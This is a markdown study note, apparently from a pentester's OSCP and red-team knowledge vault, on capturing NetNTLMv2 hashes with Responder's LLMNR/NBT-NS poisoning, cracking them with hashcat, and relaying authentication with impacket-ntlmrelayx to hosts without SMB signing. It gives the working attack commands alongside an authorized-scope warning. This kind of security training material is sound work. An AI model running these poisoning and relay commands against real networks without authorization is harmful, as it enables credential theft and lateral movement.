---
status: working
tags:
  - red-team
  - responder
  - ntlm-relay
  - ntlm
  - mitm
---
> *Responder and NTLM Relay:* Capturing and relaying Windows authentication by answering name-resolution queries on the wire. This is core internal red-team and lab methodology, and it is exam-banned on the OSCP (active poisoning/spoofing is an automatic fail). It lives here in Red Team Ops, not the AD notes, precisely because it is an operational technique you use everywhere except the exam.

> [!danger] OSCP Note
> Never run these on the OSCP. On real engagements, only within authorized scope and rules of engagement.

## Capture (poison LLMNR/NBT-NS, grab NetNTLMv2)

Responder listens for name-resolution queries and answers them so victims authenticate to you, yielding a crackable NetNTLMv2 hash.

```bash
sudo responder -I eth0 -wv
hashcat -m 5600 captured_ntlmv2.txt /usr/share/wordlists/rockyou.txt
```

## Relay (forward the auth instead of cracking)

When SMB signing is off, forward captured auth to another host for code execution or hash dumping.

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```

> [!note]
> `ntlmrelayx` forwards the auth to a target where SMB signing is disabled (the `smb-security-mode` finding from [[Service Enumeration]] tells you which). The Windows-side analog is `Inveigh`. These feed straight into [[AD Lateral Movement and Persistence]] once you have a hash or a relayed session.

## See Also

- [[AD Attacks]] and [[AD Lateral Movement and Persistence]] for the exam-legal AD chain
- [[Hash Cracking]] for the `-m 5600` NetNTLMv2 crack
- [[Service Enumeration]] for spotting SMB-signing-disabled targets
- Source: [[OSCP Field Manual]] section 7.7
